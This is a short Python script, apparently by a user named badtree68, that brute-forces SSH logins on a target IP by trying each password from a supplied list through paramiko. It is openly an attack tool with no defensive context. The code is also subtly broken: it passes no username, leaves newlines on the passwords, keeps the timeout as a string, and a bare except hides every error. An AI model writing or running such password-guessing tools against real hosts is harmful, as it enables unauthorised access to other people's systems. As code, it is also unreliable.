import paramiko
from colorama import Fore,init
init()
bruteforce=paramiko.SSHClient()
print(f"{Fore.RED} programmer : badtree68 {Fore.RESET}")
ip=input(f"{Fore.GREEN}enter a ip: ")
passlist=input("enter a passlist: ")
time=input(f"enter your timeout: {Fore.RESET}")
openfile=open(passlist,"r")
for passwords in openfile:
    try:
        bruteforce.connect(hostname=ip,password=passwords,timeout=time)
        print(f"{Fore.BLACK}connected ! {passwords}")
    except:
        print(f"{Fore.YELLOW}password is incorrect {passwords}")
